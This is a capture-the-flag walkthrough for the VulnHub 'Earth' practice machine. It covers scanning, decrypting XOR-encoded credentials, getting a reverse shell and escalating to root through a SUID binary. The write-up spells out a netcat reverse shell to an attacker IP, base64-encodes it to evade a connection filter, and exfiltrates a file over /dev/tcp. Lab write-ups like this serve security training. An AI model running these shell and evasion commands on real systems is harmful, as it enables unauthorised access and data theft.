# VulnHub: Earth – Exploitation Walkthrough



**1. Reconnaissance**

Start the vulnhub VM. Perform a network scan to identify the target machine’s IP address.
On windows, I use ‘Zenmap’ (Nmap GUI) and netdiscover in kali.
Match the network’s MAC address to confirm the target :


<img width="1125" height="544" alt="image" src="https://github.com/user-attachments/assets/72e8dec7-5505-4004-8f37-2067af2a87d9" />


<img width="1125" height="555" alt="image" src="https://github.com/user-attachments/assets/040c7cfe-422c-41f5-b7b6-1d231b4113a9" />


The Nmap scan result  found a DNS linked to the IP.  terratest.earth.local and earth.local

<img width="1125" height="352" alt="image" src="https://github.com/user-attachments/assets/9d0cf93a-ee12-421a-93b8-dec2673c862f" />



**2. Weaponization & Deliver**
To access these domains, add them to the local hosts file.

Windows: C:\Windows\System32\drivers\etc\hosts → Edit with Notepad (Admin) and add the IP + DNS.


Linux: sudo nano /etc/hosts → Add the IP + DNS.


<img width="719" height="109" alt="image" src="https://github.com/user-attachments/assets/63178f7e-589d-4152-8417-413512c9a1cb" />

<img width="909" height="323" alt="image" src="https://github.com/user-attachments/assets/db7ba3f6-ae33-4338-a3ac-a025baca958d" />


Use ```arp -a``` to verify network mapping : 

<img width="443" height="268" alt="image" src="https://github.com/user-attachments/assets/4abb8e8d-fc40-4238-9a63-5252e560878e" />

Attempt to access the target’s web interface: 

<img width="1039" height="968" alt="image" src="https://github.com/user-attachments/assets/28d474ef-f371-42e0-a653-9590d812f993" />



**3. Exploitation**
Scan for vulnerabilities using Gobuster.
First target: earth.local — scan both HTTP and HTTPS (results may differ).


<img width="1091" height="1217" alt="image" src="https://github.com/user-attachments/assets/c5ebdad5-0862-46f9-8322-14c5d3601880" />

Next target: terratest.earth.local

<img width="1125" height="778" alt="image" src="https://github.com/user-attachments/assets/b43bb322-7bfb-4323-bb19-e747df59d01c" />


Note: HTTP 403 = request understood but access denied due to insufficient permissions.

Attempt /admin/ path → click the login hyperlink.


<img width="1125" height="380" alt="image" src="https://github.com/user-attachments/assets/cf86a4cb-e7d2-4dec-b809-b9462afc54b5" />



<img width="1125" height="586" alt="image" src="https://github.com/user-attachments/assets/424f9704-9de2-4505-9d38-0fc291b1391c" />


Explore other discovered paths : 

<img width="1030" height="273" alt="image" src="https://github.com/user-attachments/assets/e288cf4e-3a26-4016-aef0-4f34d3efa164" />


<img width="994" height="878" alt="image" src="https://github.com/user-attachments/assets/0f7e2d04-acd1-4622-b139-b6c52319a0c1" />


The testingnotes entry suggests a text file. Append it to the URL : 

<img width="1125" height="324" alt="image" src="https://github.com/user-attachments/assets/03b37abd-ad1a-4e2c-9373-c1025eac19d7" />

Clues found:


o	Username: terra


o	XOR encryption used on a message.


o	testdata.txt used for encryption testing.


Use CyberChef (https://gchq.github.io/CyberChef/) to decrypt and retrieve credentials:


<img width="1188" height="460" alt="image" src="https://github.com/user-attachments/assets/2a2a71e2-1846-44e3-88a8-12c1c89b64fc" />


<img width="983" height="419" alt="image" src="https://github.com/user-attachments/assets/b69bc3a8-e55e-46a9-891b-88a8a2370a32" />


Login : terra


Password : earthclimatechangebad4humans


Log in to the admin portal : 


<img width="1072" height="153" alt="image" src="https://github.com/user-attachments/assets/2184eb25-1c6a-4505-966d-259f58ee0c9c" />


Explore the machine directory :


<img width="1125" height="194" alt="image" src="https://github.com/user-attachments/assets/b5243a08-8990-4803-8b2f-706938faeb60" />


<img width="875" height="89" alt="image" src="https://github.com/user-attachments/assets/6fcb68dc-159a-425b-967f-6afceb253f97" />


<img width="655" height="167" alt="image" src="https://github.com/user-attachments/assets/2b706fa3-3acc-4be9-92a1-a46345ea16cb" />


<img width="1125" height="302" alt="image" src="https://github.com/user-attachments/assets/4e075543-d707-4104-885f-47c5895ad791" />


Flag obtained: **[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]**


**4. Installation**


Decode the Netcat listener command:
```echo ‘nc -e /bin/bash 192.168.1.9 4444’ | base64```

<img width="709" height="213" alt="image" src="https://github.com/user-attachments/assets/3c80ea66-d78d-4703-bcd3-528074f4399b" />


Remote connections are not allowed from target pc.

To bypass this, we need need to encrypt the command and force it to be decrypted and run at the same time.

```echo ‘nc -e /bin/bash <attacker_IP> 4444’ | base64```    (note :  Replace with your listener machine’s IP, not the target’s.)


<img width="705" height="125" alt="image" src="https://github.com/user-attachments/assets/efea4fc3-84b8-42cd-b7ec-ceb772c6632a" />


On earth.local, decode and execute in one step:
```echo ‘put-base64-string-here’ | base64 -d | bash```


The server may freeze, but the Netcat listener will receive a shell. 


<img width="1125" height="217" alt="image" src="https://github.com/user-attachments/assets/24022197-88e2-4ed2-98bd-1b0660e13195" />


<img width="789" height="191" alt="image" src="https://github.com/user-attachments/assets/3cdb4a61-3126-42ce-9ee9-8e4006bdad12" />



**5. Command & Control**

Verify access with ```whoami```


<img width="775" height="84" alt="image" src="https://github.com/user-attachments/assets/024f74d0-78fc-479a-bb47-55e0dc6116de" />


Look for weak file permission that can be executed with root privilege by apache user : 


```find / -perm -u=s -type f  2>/dev/null```


<img width="516" height="378" alt="image" src="https://github.com/user-attachments/assets/ead9403b-2a8c-4a12-8a09-553410c10be9" />


Look’s like what we need from the word itself .
Check file type: ```file /usr/bin/reset_root```


Try to run : ```reset_root``` → not executable yet.


<img width="1315" height="64" alt="image" src="https://github.com/user-attachments/assets/7ed5e9b1-068b-4beb-be60-5e77702c8402" />



**6. Privilege Escalation**


File is not executable. Yet.
Now, I will send the file to the kali using netcat to utilize other tools.


Open new terminal and type : ```nc -lvnp 3333 > reset_root```


Back to terminal that connected to the earth, type : 
```cat /usr/bin/reset_root > /dev/tcp/ <kali_IP>//3333```


<img width="1125" height="203" alt="image" src="https://github.com/user-attachments/assets/7d8b135b-91d8-4ecd-b175-42fb8d0e3041" />


Confirm transfer with ```ls```

<img width="1122" height="120" alt="image" src="https://github.com/user-attachments/assets/7cfa0fba-554b-40de-899c-bd0de8cf025f" />


Next, install ‘ltrace’ : ```sudo apt install ltrace```
run ‘ltrace’ to the file : ```ltrace ./reset_root```


<img width="1125" height="366" alt="image" src="https://github.com/user-attachments/assets/a5c6a15c-9e6e-4810-9a61-c0b15059bfa2" />


The highlighted are the files that are missing to execute the file. We need to create it in our netcat connection on the earth.local
```touch + [the filepath from the ltrace results]``` then press enter.


After creating all required files, Run the ```reset_root``` again. You see that the root password is reset to ‘Earth’


<img width="802" height="200" alt="image" src="https://github.com/user-attachments/assets/fa785e5c-387b-4400-b455-3b93050bc6c6" />



**7. Actions on Objective**

Now go to vulnhub machine. 
Login as ‘root’ with the password : Earth
Check the directory and look for the flag: ```ls```
Check the ‘root_flag.txt’


<img width="991" height="1113" alt="image" src="https://github.com/user-attachments/assets/69632922-50e4-41f0-a225-4815a771cb46" />
